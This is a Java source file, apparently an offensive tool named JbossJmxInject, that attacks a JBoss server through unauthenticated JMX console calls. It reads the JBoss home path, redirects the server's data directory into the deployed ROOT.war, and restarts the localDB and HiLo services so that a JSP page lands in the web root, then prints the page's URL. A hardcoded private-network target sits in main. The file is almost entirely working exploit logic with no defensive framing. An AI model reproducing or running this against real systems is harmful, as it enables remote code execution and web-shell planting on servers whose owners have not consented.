package cn.geniusman.inject;

import java.io.IOException;
import java.net.URLEncoder;

import org.htmlcleaner.CleanerProperties;
import org.htmlcleaner.HtmlCleaner;
import org.htmlcleaner.TagNode;

import cn.geniusman.constant.Constant;
import cn.geniusman.exception.CommunicationException;
import cn.geniusman.util.Util;

public class JbossJmxInject {

	/**
	 * @param args
	 */
	public static void main(String[] args) {
		final JbossJmxInject j = new JbossJmxInject();
		j.injectVersion6("http://192.168.100.185:8280");
	}

	/**
	 * inject the
	 * 
	 * @param targetUrl
	 */
	private void injectVersion6(final String targetUrl) {
		try {
			// get jBoss home
			final String jbossHome = parsePreElement(Util.post(targetUrl
					+ Constant.FIND_JBOSS_HOME_URL, ""));
			System.out.println(jbossHome);
			// append the specified string like file
			// linux ->
			// file:/opt/jboss-6.1.0.Final/server/default/deploy/ROOT.war/localDB;file=
			// windows ->
			// file:/C:/SN/JB/server/default/deploy/ROOT.war/localDB;file=
			final String specifiedStr = Constant.FILE_PREFIX
					+ (jbossHome.startsWith("/") ? "" : "/") + jbossHome
					+ Constant.DEFAULT_JBOSS_FOLDER;
			final String setJbossDateFolderStr = targetUrl
					+ Constant.SET_JBOSS_HOME_URL
					+ URLEncoder.encode(specifiedStr, "UTF-8");
			// set the jboss.server.data.dir environment path
			Util.post(setJbossDateFolderStr, "");

			// restart the localDB service
			Util.post(targetUrl + Constant.START_LOCAL_DB_URL, "");
			Util.post(targetUrl + Constant.STOP_LOCAL_DB_URL, "");

			// HiLo apply change
			Util.post(targetUrl + Constant.HILO_APPLY_URL, "");

			// restart the HiLo service
			Util.post(targetUrl + Constant.START_HILO_URL, "");
			Util.post(targetUrl + Constant.STOP_HILO_URL, "");

			// get the target url and print it
			Util.post(targetUrl + Constant.LAST_JSP_NAME, "");

			// if successfully print the last jsp url
			System.out.println(targetUrl + Constant.LAST_JSP_NAME);
		} catch (CommunicationException ex) {
			ex.printStackTrace();
		} catch (IOException ex) {
			ex.printStackTrace();
		}
	}

	private String parsePreElement(final String response) {
		final CleanerProperties cp = new CleanerProperties();
		cp.setUseCdataForScriptAndStyle(true);
		cp.setRecognizeUnicodeChars(true);
		cp.setUseEmptyElementTags(true);
		cp.setAdvancedXmlEscape(true);

		final HtmlCleaner hc = new HtmlCleaner(cp);
		final TagNode node = hc.clean(response);
		System.out.println(response);
		return addAllTagNode(node);
	}

	private String addAllTagNode(final TagNode node) {
		final TagNode[] tagArray = node.getAllElements(true);
		final TagNode n = node.findElementByName("pre", false);
		if (n != null) {
			return removeBr(n.getText());
		}

		for (final TagNode o : tagArray) {
			final String ret = addAllTagNode(o);
			if (ret != null) {
				return ret;
			}
		}
		return null;
	}

	private String removeBr(final CharSequence charS) {
		return charS.toString().replaceAll("\n", "");
	}

}
